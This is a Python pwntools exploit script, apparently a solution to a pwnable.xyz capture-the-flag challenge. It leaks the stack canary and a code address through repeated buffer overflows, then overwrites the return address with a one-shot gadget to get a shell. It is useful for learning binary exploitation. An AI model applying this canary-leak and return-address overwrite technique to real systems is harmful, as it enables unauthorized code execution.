from pwn import *

#context.log_level = 'debug'

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30027)

#pause()

while True:
        s.recvuntil("me  > ")
        badayum_len = len(str(s.recvuntil("\n")))
        s.recvuntil("you > ")

        if(badayum_len >= 105):
                pay = "A"*105
                s.send(pay)
                break

        else:
                s.sendline("A")

s.recvuntil("You said: ")
s.recvuntil("A"*104)

canary = u64(s.recv(8)) - ord('A')
print hex(canary)

while True:
	s.recvuntil("me  > ")
	badayum_len = len(str(s.recvuntil("\n")))
	s.recvuntil("you > ")

	if(badayum_len >= 0x78):
		pay = "A"*0x78
		s.send(pay)
		break

	else:
		s.sendline("A")

s.recvuntil("You said: ")
s.recvuntil(pay)

leak = u64(s.recv(6).ljust(8,"\x00")) - 0x1081
print hex(leak)
oneshot = leak + 0xd30

while True:
        s.recvuntil("me  > ")
        badayum_len = len(str(s.recvuntil("\n")))
        s.recvuntil("you > ")

        if(badayum_len >= (0x78+8)):
                pay = "A"*104 + p64(canary) + "A"*8 + p64(oneshot)
                s.send(pay)
                break

        else:
                s.sendline("A")

s.interactive()
